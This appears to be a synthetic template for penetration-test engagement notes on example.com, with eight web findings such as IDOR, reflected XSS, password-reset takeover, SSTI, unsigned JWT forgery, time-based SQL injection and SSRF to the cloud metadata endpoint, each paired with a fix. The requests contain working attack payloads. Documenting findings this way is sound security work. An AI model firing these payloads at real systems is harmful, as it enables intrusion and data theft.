# Example Engagement Notes: example.com

> Synthetic example to show how to structure notes. Replace tokens, IDs, and hosts with real data.

## Scope
- https://app.example.com
- https://api.example.com
- https://admin.example.com

## Recon (quick)
- Passive: DNS + subdomain enum, tech stack fingerprints, JS asset review.
- Active: Spider, wordlists on /api, and parameter discovery on core flows.
- Key endpoints discovered:
  - `GET /api/v1/users/{id}/profile`
  - `POST /api/v1/password/reset`
  - `GET /search?q=`
  - `POST /admin/templates/preview`
  - `GET /auth/redirect?next=`
  - `POST /api/v1/orders/search`
  - `POST /api/v1/fetch`

---

## Finding 1: IDOR (User Profile Disclosure)
**Severity:** High

**Summary**
A normal user can access another user's profile by changing the `userId` path parameter. The server does not validate ownership.

**Impact**
Disclosure of PII (name, email, phone, address) and potential pivot into other account actions.

**Steps**
1. Log in as a normal user (userId 10421).
2. Request another user's profile by changing the path parameter.
3. Observe the API returns the other user's data.

**Request**
```req
GET /api/v1/users/10422/profile HTTP/1.1
Host: api.example.com
Accept: application/json
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.example.user
User-Agent: Burp
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "id": 10422,
  "email": "victim10422@example.com",
  "name": "Jamie Doe",
  "phone": "+1-555-0104",
  "address": "123 Market St, Apt 7"
}
```

**Notes**
- No 403/401, response includes another user's PII.
- `{screenshot_20250128_101200_idor.png}`

**Fix**
Enforce object-level access control on every request (verify the requesting user owns the resource or has the required role).

---

## Finding 2: Reflected XSS in Search
**Severity:** Medium

**Summary**
The `q` parameter is reflected into HTML without encoding. JavaScript executes in the user's browser.

**Impact**
Session hijacking, user actions, and data exfiltration within the victim's session.

**Steps**
1. Navigate to the search endpoint with a script payload.
2. Payload is reflected and executed.

**Request**
```req
GET /search?q=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1
Host: app.example.com
Accept: text/html
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.example.user
User-Agent: Burp
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<html>
  <body>
    <h1>Search results for: <svg/onload=alert(1)></h1>
    <div>No results.</div>
  </body>
</html>
```

**Fix**
Contextually encode untrusted input and apply a strict CSP with `script-src`.

---

## Finding 3: Account Takeover (Password Reset + Session Persistence)
**Severity:** Critical

**Summary**
Password reset tokens are valid for 24 hours and can be reused. Existing sessions remain valid after password reset.

**Impact**
Full account takeover with persistent access.

**Steps**
1. Trigger password reset for victim.
2. Use the reset token to set a new password.
3. Confirm victim's existing session remains active.
4. Log in with the new password.

**Request (reset token reuse)**
```req
POST /api/v1/password/reset HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "token": "RESET-1A2B3C4D5E6F",
  "newPassword": "Attacker!2025"
}
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"ok"}
```

**Request (login after reset)**
```req
POST /api/v1/login HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"email":"victim10422@example.com","password":"Attacker!2025"}
```

**Response**
```response
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.new.attacker; HttpOnly; Secure
Content-Type: application/json

{"mfa":"not_required","userId":10422}
```

**Notes**
- Reset token can be reused multiple times within 24 hours.
- Existing sessions not invalidated after reset.
- `{screenshot_20250128_101900_ato.png}`

**Fix**
- Make reset tokens single-use and short-lived.
- Invalidate all active sessions on password change/reset.
- Enforce MFA/step-up on high-risk changes.

---

## Finding 4: Open Redirect in OAuth Return
**Severity:** Medium

**Summary**
The `next` parameter is not validated and allows redirects to external domains.

**Impact**
Phishing and token theft via malicious redirect after login.

**Request**
```req
GET /auth/redirect?next=https://evil.example.net/callback HTTP/1.1
Host: app.example.com
Accept: text/html
```

**Response**
```response
HTTP/1.1 302 Found
Location: https://evil.example.net/callback
```

**Fix**
Allowlist trusted domains and use relative URLs only.

---

## Finding 5: SSTI in Email Template Preview
**Severity:** High

**Summary**
Admin email template preview renders server-side expressions. Input is evaluated by the template engine.

**Impact**
Potential server-side code execution or data exposure.

**Request**
```req
POST /admin/templates/preview HTTP/1.1
Host: admin.example.com
Content-Type: application/json
Cookie: session=admin.example.token

{
  "template": "Hello {{7*7}}",
  "context": {"user":"test"}
}
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: application/json

{"preview":"Hello 49"}
```

**Fix**
Use a safe template engine or sandboxed mode and strictly escape user input.

---

## Finding 6: JWT / Token Issues (alg=none)
**Severity:** High

**Summary**
The API accepts unsigned JWTs when `alg` is set to `none`.

**Impact**
An attacker can forge admin tokens and access privileged endpoints.

**Request**
```req
GET /api/v1/admin/metrics HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiIxMDQyMiIsInJvbGUiOiJhZG1pbiJ9.
Accept: application/json
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: application/json

{"users":12084,"ordersToday":421,"revenueToday":17329.44}
```

**Fix**
Reject `alg=none`, require signed tokens, and enforce server-side role checks.

---

## Finding 7: SQL Injection (time-based)
**Severity:** High

**Summary**
The `q` parameter in `/api/v1/orders/search` is vulnerable to time-based SQL injection.

**Request**
```req
POST /api/v1/orders/search HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"q":"test' OR SLEEP(5)-- -"}
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: application/json
X-Response-Time: 5.02s

{"results":[]}
```

**Fix**
Use parameterized queries and validate/normalize input.

---

## Finding 8: SSRF in URL Fetcher
**Severity:** Medium

**Summary**
The `/api/v1/fetch` endpoint fetches arbitrary URLs without an allowlist.

**Request**
```req
POST /api/v1/fetch HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/"}
```

**Response**
```response
HTTP/1.1 200 OK
Content-Type: text/plain

ami-id
instance-id
local-hostname
```

**Fix**
Use strict allowlists, block internal IP ranges, and disable redirects.

---

## Quick Summary Table
| Finding | Severity | Status |
| --- | --- | --- |
| IDOR (User Profile Disclosure) | High | Open |
| Reflected XSS in Search | Medium | Open |
| Account Takeover (Reset + Sessions) | Critical | Open |
| Open Redirect in OAuth Return | Medium | Open |
| SSTI in Email Template Preview | High | Open |
| JWT / Token Issues (alg=none) | High | Open |
| SQL Injection (time-based) | High | Open |
| SSRF in URL Fetcher | Medium | Open |
